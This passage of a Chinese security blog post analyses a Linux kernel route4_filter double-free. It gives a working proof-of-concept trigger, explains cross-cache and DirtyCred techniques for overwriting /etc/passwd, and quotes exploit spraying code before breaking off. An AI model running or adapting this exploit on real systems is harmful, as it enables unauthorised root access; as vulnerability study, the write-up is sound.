class="keyword">int</span> <span class="title">build_qfq</span><span class="params">(<span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">char</span> *qopt;</span><br><span class="line">        <span class="keyword">short</span> *tlen;</span><br><span class="line">        <span class="keyword">char</span> *qdisc = <span class="string">&quot;qfq&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">short</span> *optlen;</span><br><span class="line">        <span class="keyword">short</span> *opttype;</span><br><span class="line"></span><br><span class="line">        tlen = buf;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        <span class="built_in">memcpy</span>(buf, linkcmd, <span class="keyword">sizeof</span>(linkcmd));</span><br><span class="line">        <span class="built_in">strcpy</span>(buf+<span class="keyword">sizeof</span>(linkcmd), qdisc);</span><br><span class="line">        *tlen = <span class="keyword">sizeof</span>(linkcmd) + <span class="built_in">strlen</span>(qdisc) + <span class="number">1</span>;</span><br><span class="line">        buf[<span class="number">36</span>] = <span class="built_in">strlen</span>(qdisc)+<span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">        qopt = buf + *tlen;</span><br><span class="line">        <span class="comment">/* nla_len, nla_type */</span></span><br><span class="line">        <span class="comment">/* 24, 0x00, 0x02, 0x00, */</span></span><br><span class="line">        optlen = qopt;</span><br><span class="line">        opttype = optlen + <span class="number">1</span>;</span><br><span class="line">        *opttype = <span class="number">0x2</span>;</span><br><span class="line"></span><br><span class="line">        *optlen = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">        *tlen += *optlen;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> *tlen;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        <span class="keyword">int</span> s;</span><br><span class="line">        <span class="keyword">pid_t</span> p;</span><br><span class="line">        <span class="keyword">int</span> *error;</span><br><span class="line">        <span class="keyword">char</span> buf[<span class="number">4096</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        <span class="keyword">int</span> tlen;</span><br><span class="line">        <span class="keyword">char</span> buf2[<span class="number">4096</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">        error = (<span class="keyword">int</span> *) (buf + <span class="number">16</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">long</span> count = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line"></span><br><span class="line">        unshare(CLONE_NEWUSER|CLONE_NEWNET);</span><br><span class="line">        tlen = build_qfq(buf);</span><br><span class="line">        s = socket(AF_NETLINK, SOCK_RAW|SOCK_NONBLOCK, NETLINK_ROUTE);</span><br><span class="line">        perror(<span class="string">&quot;socket:&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;s: %d\n&quot;</span>,s);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;newlink:\n&quot;</span>);</span><br><span class="line">        hexdump(newlink,<span class="number">0x100</span>);</span><br><span class="line">        write(s, newlink, <span class="keyword">sizeof</span>(newlink));</span><br><span class="line">        read(s, buf2, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        perror(<span class="string">&quot;NLMSG_ERROR&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;err:%d\n&quot;</span>, *error);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;msg type:%d\n&quot;</span>,*(<span class="keyword">short</span> *)(buf + <span class="number">4</span>));</span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;qdisc:\n&quot;</span>);</span><br><span class="line">        hexdump(buf,<span class="number">0x100</span>);</span><br><span class="line">        write(s, buf, tlen);</span><br><span class="line">        read(s, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;err:%d\n&quot;</span>, *error);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;tfilter:\n&quot;</span>);</span><br><span class="line">        hexdump(tfilter,<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">        write(s, tfilter, <span class="keyword">sizeof</span>(tfilter));</span><br><span class="line">        read(s, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;err:%d\n&quot;</span>, *error);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ntfilter:\n&quot;</span>);</span><br><span class="line">        hexdump(ntfilter,<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">        write(s, ntfilter, <span class="keyword">sizeof</span>(ntfilter));</span><br><span class="line">        read(s, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Err:%d\n&quot;</span>, *error);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;dellink:\n&quot;</span>);</span><br><span class="line">        hexdump(dellink,<span class="number">0x100</span>);</span><br><span class="line"></span><br><span class="line">        write(s, dellink, <span class="keyword">sizeof</span>(dellink));</span><br><span class="line">        read(s, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;err:%d\n&quot;</span>, *error);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>poc写的比较清晰的，首先是<code>socket(AF_NETLINK, SOCK_RAW|SOCK_NONBLOCK, NETLINK_ROUTE);</code>,然后发了五次包，第一第二次好似是设置网络设备的，比较重要的是第三第四和四五次发包，第三次发包是创建了一个<code>handle</code>为0的<code>route4_filter</code>，第四次发包还是传入一个<code>handle</code>为0的<code>route4_filer</code>，这样第一次创建的<code>route4_filer</code>就被释放当时没有脱链，然后第五次发包是删除第一次发包创建的<code>link</code>,这样就顺带着把他的<code>route4_filer</code>也给free掉了，这样就构成了一个<code>doublefree</code>了。而且不止doubelfree了<code>route4_filter</code>，还doublefree了一个指针数组，前一个的obj的size为<code>kmalloc-192</code>,后一个是<code>kmalloc-256</code></p>
<p>触发了doublefree但是内核并没有直接崩溃。</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20221201205500293.png" alt="image-20221201205500293"></p>
<h3 id="漏洞利用原理"><a href="#漏洞利用原理" class="headerlink" title="漏洞利用原理"></a>漏洞利用原理</h3><p>感觉挺有意思的，也学到了很多东西，漏洞利用主要分为两部分，分别是<code>cross cache attack</code>和<code>dirty cred</code>，下面分别就这两点详细展开学习。</p>
<h4 id="cross-cache-attack"><a href="#cross-cache-attack" class="headerlink" title="cross cache attack"></a>cross cache attack</h4><p>他的主要作用就是绕过内核的slab隔离。在没有看n1ctf那道内核题目之前还不是能完全理解这种攻击思路的强大，现在再来看的是发现简直好用的一。</p>
<p>内核是从<code>kmem_cahches</code>中申请不同大小的obj的，而<code>keme_caches</code>即<code>kmalloc slab allocation</code>则是基于<code>buddy allocator</code>的，<code>buddy allocator</code>就是伙伴系统，当kmalloc cache上没有足够的obj的时候，就会向buddy allocator申请<code>order-n page</code>,具体会调用 <code>new_slab()</code> -&gt; <code>allocate_slab()</code> -&gt; <code>alloc_slab_page()</code> 向 buddy allocator 申请页。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Slab allocation and freeing</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> struct slab *<span class="title">alloc_slab_page</span><span class="params">(<span class="keyword">gfp_t</span> flags, <span class="keyword">int</span> node,</span></span></span><br><span class="line"><span class="params"><span class="function">        struct kmem_cache_order_objects oo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">folio</span> *<span class="title">folio</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">slab</span> *<span class="title">slab</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> order = oo_order(oo);      <span class="comment">// order = kmem_cache-&gt;oo.x &gt;&gt; 16</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (node == NUMA_NO_NODE)</span><br><span class="line">        folio = (struct folio *)alloc_pages(flags, order);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        folio = (struct folio *)__alloc_pages_node(node, flags, order);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!folio)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">    slab = folio_slab(folio);</span><br><span class="line">    __folio_set_slab(folio);</span><br><span class="line">    <span class="keyword">if</span> (page_is_pfmemalloc(folio_page(folio, <span class="number">0</span>)))</span><br><span class="line">        slab_set_pfmemalloc(slab);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> slab;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>其中order-n中的n到底是多少就看这个slab的类型了，可以通过<code>cat /proc/slabinfo</code>快速知道,我查看我自己ubuntu16的cred的slab,发现要要是用伙伴系统中的<code>order-2</code>，也就是一次向伙伴系统中直接申请两个连续的页面用于cred的slab。</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">➜  ~ sudo cat /proc/slabinfo | grep cred</span><br><span class="line">cred_jar            8316   8316    192   42    2 : tunables    0    0    0 : slabdata    198    198      0</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li>buddy allocator 为每个 order-n page 保存着一个 FIFO queue 数组，order-n page 表示 2^n个连续页的内存。当你释放chunk后导致slab全部空闲时，slab allocator 就会将页还给 buddy allocator。</li>
<li>slab对应的order由很多因素决定，如 slab chunk 大小、系统定义、内核编译等，最简单的方法是查看 <code>/proc/slabinfo</code>。</li>
<li>如果所申请的 order-n page 队列为空，则将 order-n+1 的页一分为二，一半返回给申请者，一半保存在 order-n 中；如果1个page返回给 buddy allocator，且其对应的 buddy page 也在同一队列中，则整合后放在下一order的page队列中。</li>
</ul>
<p>cross cache attack原理攻击的整体思路是，当一个slab 页面被全部释放的时候会被回收，这时被回收的页面是可以被其他种类的slab使用的这样就可以跨slab种类来进行利用，如Zhenpeng Lin 的ppt中演示的：</p>
<p><img src="https://img-blog.csdnimg.cn/a2523bab1dc14ef6815c3dffd48f9c30.png#pic_center" alt="在这里插入图片描述"></p>
<p>假定我们有一个非法释放漏洞(或double free)，但只能释放普通slab 中的堆块：</p>
<ul>
<li>1.首先喷射一堆该大小的普通堆块，这样会消耗一大堆slab 页面。我们的double free目标指针指向其中一个堆块，先将其释放</li>
<li>2.然后将喷射的一大堆普通堆块都释放掉，这样double free目标堆块所在slab 页面中的所有堆块(绝大概率)会被都释放掉，该slab 页面为空，会被系统回收</li>
<li>3.这时喷射一大堆filp / 其他slab 类型的堆块，这样目标指针所在页面大概率会被filp 类型slab或其他目标类型slab重新申请到吗，并且目标指针(double free漏洞指针)指向其中一个struct file结构体</li>
<li>4.使用漏洞的第二次释放能力，该struct file结构体被非法释放</li>
</ul>
<h4 id="dirty-cred"><a href="#dirty-cred" class="headerlink" title="dirty cred"></a>dirty cred</h4><h5 id="struct-file"><a href="#struct-file" class="headerlink" title="struct file"></a>struct file</h5><p>很有意思的一个攻击思路。主要的思路就是利用高凭证替换低凭证。而凭证一般就是<code>cred</code>和<code>file</code>,下面主要探讨在<code>doublefree</code>情况下如何进行凭证替换。</p>
<p>file结构体是打开一个文件时就会创建的一个结构体。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> &#123;</span></span><br><span class="line">	<span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">llist_node</span>	<span class="title">fu_llist</span>;</span></span><br><span class="line">		<span class="class"><span class="keyword">struct</span> <span class="title">rcu_head</span> 	<span class="title">fu_rcuhead</span>;</span></span><br><span class="line">	&#125; f_u;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">path</span>		<span class="title">f_path</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">inode</span>		*<span class="title">f_inode</span>;</span>	<span class="comment">/* cached value */</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span>	*<span class="title">f_op</span>;</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Protects f_ep, f_flags.</span></span><br><span class="line"><span class="comment">	 * Must not be taken from IRQ context.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">spinlock_t</span>		f_lock;</span><br><span class="line">	<span class="class"><span class="keyword">enum</span> <span class="title">rw_hint</span>		<span class="title">f_write_hint</span>;</span></span><br><span class="line">	<span class="keyword">atomic_long_t</span>		f_count;</span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">int</span> 		f_flags;</span><br><span class="line">	<span class="keyword">fmode_t</span>			f_mode; <span class="comment">//读写权限</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">mutex</span>		<span class="title">f_pos_lock</span>;</span></span><br><span class="line">	<span class="keyword">loff_t</span>			f_pos;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">fown_struct</span>	<span class="title">f_owner</span>;</span></span><br><span class="line">	<span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span>	*<span class="title">f_cred</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">file_ra_state</span>	<span class="title">f_ra</span>;</span></span><br><span class="line"></span><br><span class="line">	u64			f_version;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_SECURITY</span></span><br><span class="line">	<span class="keyword">void</span>			*f_security;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">	<span class="comment">/* needed for tty driver, and maybe others */</span></span><br><span class="line">	<span class="keyword">void</span>			*private_data;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_EPOLL</span></span><br><span class="line">	<span class="comment">/* Used by fs/eventpoll.c to link all the hooks to this file */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">hlist_head</span>	*<span class="title">f_ep</span>;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span> <span class="comment">/* #ifdef CONFIG_EPOLL */</span></span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">address_space</span>	*<span class="title">f_mapping</span>;</span></span><br><span class="line">	<span class="keyword">errseq_t</span>		f_wb_err;</span><br><span class="line">	<span class="keyword">errseq_t</span>		f_sb_err; <span class="comment">/* for syncfs */</span></span><br><span class="line">&#125; __randomize_layout</span><br><span class="line">  __attribute__((aligned(<span class="number">4</span>)));	<span class="comment">/* lest something weird decides that 2 is OK */</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file_handle</span> &#123;</span></span><br><span class="line">	__u32 handle_bytes;</span><br><span class="line">	<span class="keyword">int</span> handle_type;</span><br><span class="line">	<span class="comment">/* file identifier */</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span> f_handle[];</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>下面是介绍<code>dirty cred</code>的论文中提到的doublefree情况下的利用过程，但我觉得其实没必要这么麻烦的，如果只是高凭证替换低凭证的话，假如<code>ptr1</code>拥有doublefree,那先把ptr1给free一次，然后让低凭证申请到这个obj,就记作ptr2,然后再free一次ptr1,就把低凭证也给free掉了，接着再堆喷低凭证,再次申请到ptr2指向的内存，记作ptr3,这样ptr2和ptr3就指向了桶一块低凭证<code>struct file</code>了，然后通过系统调用<code>kcmp</code>来得知<code>ptr2</code>和<code>ptr3</code>指向同一个<code>struct file</code>(因为是堆喷)，然后释放低凭证的<code>struct file</code>就能替换成高凭证了。</p>
<p>哦我懂了，下面的方法其实更加通用，因为如果能<code>doublefree</code>的话可能obj的大小不等于<code>struct file</code>的大小，所以可能出现不对齐的现象，所以需要两个ptr指向同一个obj了。上述方法只适用于刚好对齐。</p>
<p><strong>方法</strong>：一般 Double-Free 发生在通用cache中，而内核凭证位于 dedicated cache 中，所以这里需要进行 cross-cache 内存布局。内核会回收未使用的内存页，然后分配给其他需要更多空间的cache。</p>
<ul>
<li><code>a-d</code>：两次触发DF，获得2个指向同一漏洞对象的悬垂指针（<code>ptr1&#39;</code> / <code>ptr2&#39;</code>）；</li>
<li><code>e</code>：将该通用cache的内存页全部释放归还给页管理器，这样该内存页就可以分配给 <code>dedicated cache</code> （存放凭证对象）；</li>
<li><code>f</code>：分配大量凭证对象（特殊cache）占据漏洞对象对应的空闲块，现在有3个指针指向该内存块了（2个悬垂指针和一个victim对象中的凭证指针，悬垂指针可能未对齐，指向凭证对象的内部）；</li>
<li><code>g</code>：利用其中1个悬垂指针（<code>ptr2&#39;</code>）释放凭证对象，创造空洞；</li>
<li><code>h</code>：分配新的低权限凭证对象占据该位置；</li>
<li>剩余1个悬垂指针（<code>ptr1&#39;</code>）指向低权限凭证对象，再次释放后就能用高权限凭证对象替换低权限凭证对象了。</li>
</ul>
<p><img src="https://pic4.zhimg.com/80/v2-69fe299aa60f25a13d7977bf3bbc8763_720w.webp" alt="img"></p>
<p>到目前为止已经能凭证替换了，现在就得利用凭证替换来完成对不可写文件的写入了，在老版本4.13以前使用<code>writev</code>向某个文件中写入内容时逻辑时这样的</p>
<ol>
<li>进行访问权限校验(是否可写)</li>
<li>从用户空间获取写入内容</li>
<li>实际写入操作</li>
</ol>
<p>可以看出在验证完权限和实际写入操作之间还有一步操作，这就可以形成条件竞争了，只要验证完可写权限之后就通过堵塞卡在第二步，然后替换成高凭证。再写入的时候就往不可写文件里写入内容了。</p>
<p>d按时这种办法已经是昨日黄花了，在4.13版本以后writev的逻辑就成这样了</p>
<ol>
<li>从用户空间获取写入内容</li>
<li>进行访问权限校验(是否可写)</li>
<li>实际写入操作</li>
</ol>
<p>所以在新版本就没办法利用老办法堵塞增大时间窗(从检查权限到真正操作之间的时间)了。但是增大时间窗还是有的，这就利用了文件的innode锁了。</p>
<p>在已经有一个进程对一个文件进行写入操作的时候，会给文件inode上锁，其他向该文件进行写入的进程需要等待上一个进程写入完成解锁。所以就可以有这样的利用了,这样同样可以增大时间窗。</p>
<ol>
<li>先存在一个进程向一个可写文件写入大量内容，inode锁会锁住较长时间</li>
<li>第二个进程尝试向该文件写入”打算写入/etc/passwd等特权文件的内容”</li>
<li>第三个进程利用漏洞替换file结构体</li>
</ol>
<p>到这里对struct file的攻击就已经闭环了。</p>
<h5 id="struct-cred"><a href="#struct-cred" class="headerlink" title="struct cred"></a>struct cred</h5><p>对于file类型凭据我们可以使用普通用户可读特权用户可写的/etc/passwd来进行操作，普通用户就可以喷射大量目标用于攻击。但特权的struct cred就没那么容易了。可以通过：</p>
<p>执行大量suid 程序，如sudo(但大部分情况下并没有这个权限)<br>使用kernel thread，kernel 自己创建的任务是特权任务，我们可以利用一些内核接口控制内核启动一堆kernel thread：</p>
<ul>
<li>利用workqueue</li>
<li>利用usermode helper</li>
</ul>
<h3 id="reading-exp"><a href="#reading-exp" class="headerlink" title="reading exp"></a>reading exp</h3><p>终于到了阅读exp的阶段了，距离写下这篇文章的第一行似乎已经过了两周了。。。令人感叹。</p>
<p>进程A，随时准备喷射<code>/etc/passwd</code>文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fork() == <span class="number">0</span>) &#123;</span><br><span class="line"><span class="comment">// 12. Thread 3 - spray 4096*2 priviledged `file` objects to replace unprivileged `file` (wait pipe_file_spray[0])</span></span><br><span class="line">    adjust_rlimit();</span><br><span class="line">    <span class="keyword">int</span> spray_num = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (read(pipe_file_spray[<span class="number">0</span>][<span class="number">0</span>], &amp;spray_num, <span class="keyword">sizeof</span>(<span class="keyword">int</span>)) &lt; <span class="keyword">sizeof</span>(<span class="keyword">int</span>))   <span class="comment">// use pipe_file_spray to notify</span></span><br><span class="line">      err(<span class="number">1</span>, <span class="string">&quot;[-] read file spray&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[12] got cmd, start spraying 4096*2 `file` by opening %s\n&quot;</span>, target);</span><br><span class="line">    spray_num = <span class="number">4096</span>;</span><br><span class="line">    <span class="keyword">if</span> (fork() == <span class="number">0</span>) &#123;  <span class="comment">// spray 4096 `file` (parent-process)</span></span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; spray_num; i++) &#123;</span><br><span class="line">        pin_on_cpu(i % cpu_cores);</span><br><span class="line">        open(target, <span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">while</span> (<span class="number">1</span>) &#123;sleep(<span class="number">10000</span>);&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>下面是进程B的代码，但是在进程B执行之前得等进程C执行完，进程C就是堆喷一堆<code>struct file</code>来耗尽<code>file slab</code>中的空闲object，进程B就是干了一件事，堆喷很多的<code>route4_filter </code>,然后把他释放掉，但是它申请的handler都不为0.所以只起了一个耗尽通用slab的obj的作用，等后面全部free的时候就会把对应页交给伙伴系统了。</p>
<p>但我其实不是很能理解为什么要设置<code>user namespace</code>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">setup_namespace();</span><br><span class="line">      pin_on_cpu(<span class="number">0</span>);</span><br><span class="line">      <span class="keyword">int</span> sprayfd = socket(PF_NETLINK, SOCK_RAW, <span class="number">0</span>);</span><br><span class="line">      assert(sprayfd != <span class="number">-1</span>);</span><br><span class="line">      add_qdisc(sprayfd);</span><br><span class="line"><span class="comment">// 2-1. prepare payload</span></span><br><span class="line">      <span class="keyword">char</span> msg[<span class="number">0x10</span>] = &#123;&#125;;</span><br><span class="line">      <span class="keyword">char</span> payload[<span class="number">256</span>] = &#123;&#125;;</span><br><span class="line">      <span class="built_in">memset</span>(payload + <span class="number">0x10</span>, <span class="string">&#x27;A&#x27;</span>, <span class="number">256</span> - <span class="number">0x10</span>);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (read(pipe_defrag[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] failed read defrag&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// if the exploit keeps failing, please tune the middle and end</span></span><br><span class="line">      <span class="keyword">int</span> middle = <span class="number">38</span>;       <span class="comment">// 38</span></span><br><span class="line">      <span class="keyword">int</span> end = middle + <span class="number">40</span>; <span class="comment">// 40</span></span><br><span class="line"><span class="comment">// 2-2. spray (38+3)*32 filters in kmalloc-192 &amp; kmalloc-256</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[2] spray (38+3)*32 kmalloc-192 &amp; kmalloc-256\n&quot;</span>);</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; middle; i++)</span><br><span class="line">        add_tc_basic(sprayfd, i + <span class="number">1</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">      add_tc_basic(sprayfd, middle + <span class="number">1</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line">      add_tc_basic(sprayfd, middle + <span class="number">2</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line">      add_tc_basic(sprayfd, middle + <span class="number">3</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line">      <span class="keyword">if</span> (write(pipe_child[<span class="number">1</span>], <span class="string">&quot;OK&quot;</span>, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] write to parent\n&quot;</span>);</span><br><span class="line"><span class="comment">// 4. spray more filters in kmalloc-192 &amp; kmalloc-256</span></span><br><span class="line">      <span class="keyword">if</span> (read(pipe_parent[<span class="number">0</span>], msg, <span class="number">2</span>) != <span class="number">2</span>)</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;[-] read from parent&quot;</span>);</span><br><span class="line">      <span class="comment">// add_tc_basic(sprayfd, middle+2, payload, 129, 32);</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// prepare another part for cross cache</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[4] spray kmalloc-192 &amp; kmalloc-256\n&quot;</span>);</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = middle + <span class="number">2</span>; i &lt; end; i++)</span><br><span class="line">        add_tc_basic(sprayfd, i + <span class="number">1</span>, payload, <span class="number">193</span>, <span class="number">32</span>);</span><br><span class="line"><span class="comment">// 5. free (end-24)*32 kmalloc-192 &amp; kmalloc-256</span></span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;[5] free (end-24)*32 kmalloc-192 &amp; kmalloc-256\n&quot;</span>);</span><br><span class="line">      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; end - <span class="number">24</span>; i++) &#123;</span><br><span class="line">        <span class="comment">// prevent double free of 192 and being reclaimed by others</span></span><br><span class="line">        <span class="keyword">if</span> (i == middle || i == middle + <span class="number">1</span>)</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        